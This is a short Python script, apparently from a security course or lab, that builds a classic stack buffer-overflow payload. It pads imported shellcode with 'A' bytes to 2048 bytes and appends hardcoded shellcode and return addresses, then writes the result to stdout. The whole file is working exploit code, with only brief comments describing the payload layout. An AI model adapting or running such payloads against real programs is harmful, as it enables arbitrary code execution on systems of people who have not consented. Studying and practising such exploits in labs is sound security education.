import sys
from struct import pack
from shellcode import shellcode

retadd = 0xbffea37c
shellcodeadd = 0xbffe9b68
string = shellcode + b"A"*(2048 - len(shellcode))

#Pass the shellcode plus amount of A's needed to overflow buffer
#Pass shellcode address
#Pass return address

sys.stdout.buffer.write(string + pack("<I", shellcodeadd) + pack("<I", retadd))

